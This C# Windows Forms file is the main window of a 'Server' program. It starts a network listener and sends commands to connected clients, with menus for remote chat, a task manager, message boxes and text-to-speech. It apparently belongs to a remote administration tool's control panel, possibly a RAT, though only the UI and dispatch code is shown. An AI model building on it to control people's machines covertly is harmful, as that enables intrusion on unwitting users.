using Server.Connection;
using Server.Forms;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace Server
{
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        public static FormChat chat;
        public static FormTaskManager ftm;
        public static FormT2s formT2S;
        byte[] data;

        public Form1()
        {
            InitializeComponent();
            this.BackColor = Color.Black;
        }

        private void Korgi_Load(object sender, EventArgs e)
        {
            // UTF8
            /*Properties.Settings.Default.host = "";
            Properties.Settings.Default.port = "";
            Properties.Settings.Default.Save(); */
            if(string.IsNullOrEmpty(Properties.Settings.Default.host) || string.IsNullOrEmpty(Properties.Settings.Default.port))
            {
                FormConnection fc = new FormConnection();
                fc.ShowDialog();
            }
            else
            {
                label2.ForeColor = Color.Green;
                label2.Text ="Server is listening on " + Properties.Settings.Default.host + ":" + Properties.Settings.Default.port;
                toggleButton1.Checked = true;
            }
        }

        #region Move Form
        /**   - Drag Form -   **/
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        private void label1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void label2_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }


        #endregion

        private void toggleButton1_CheckedChanged(object sender, EventArgs e)
        {
            Listener lis;
            if (toggleButton1.Checked)
            {
                lis = new Listener(Properties.Settings.Default.host, int.Parse(Properties.Settings.Default.port));
                lis.StartServer();
            }
            else
            {
                
            }
        }

        private void textToSpeechToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FormT2s t2s = new FormT2s(dataGridView1.SelectedRows.Count);
            t2s.Show();
        }

        private void messageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FormMessageBox formMessage = new FormMessageBox(dataGridView1.SelectedRows.Count);
            formMessage.Show();
        }

        private void chatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            data = Listener.MyDataPacker("OPENCHAT", Encoding.UTF8.GetBytes("null"));
            Listener.clients[dataGridView1.SelectedRows.Count - 1].Send(data);

            chat = new FormChat(dataGridView1.SelectedRows.Count);
            chat.Show();
        }

        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            data = Listener.MyDataPacker("TSK", Encoding.UTF8.GetBytes("null"));
            Listener.clients[dataGridView1.SelectedRows.Count - 1].Send(data);

            ftm = new FormTaskManager(dataGridView1.SelectedRows.Count);
            ftm.Show();
        }
    }
}
